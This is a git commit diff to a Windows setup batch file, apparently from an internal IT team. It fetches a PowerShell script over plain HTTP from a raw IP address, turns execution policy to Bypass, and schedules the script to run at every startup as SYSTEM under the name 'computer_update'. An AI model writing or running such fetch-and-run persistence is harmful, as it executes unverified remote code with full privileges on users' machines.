43b084000b685180bd8277634bdf1d607195e768
lamaw01 <Administrator@MIS-JANREY.uc-1.domain>
2023-11-10 05:29:40 +0800

    fix execution policy

--- scripts/setup.bat
+++ scripts/setup.bat
@@ -1,4 +1,8 @@
 @echo off
-powershell -c "Invoke-WebRequest -Uri 'http://103.62.153.74:53000/computer_detail/script.ps1' -OutFile '%USERPROFILE%\AppData\Local\script.ps1'"
-schtasks /create /tn "computer_update" /sc onstart /delay 0010:00 /rl highest /ru system /tr "powershell -ExecutionPolicy Bypass -File %USERPROFILE%\AppData\Local\script.ps1"
+powershell -c Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force 
+powershell  Get-ExecutionPolicy
+
+powershell -c "Invoke-WebRequest -Uri 'http://103.62.153.74:53000/computer_detail/script.ps1' -OutFile 'C:/script.ps1'"
+
+schtasks /create /tn "computer_update" /sc onstart /delay 0010:00 /rl highest /ru system /tr "powershell -ExecutionPolicy Bypass -File C:/script.ps1"
 pause
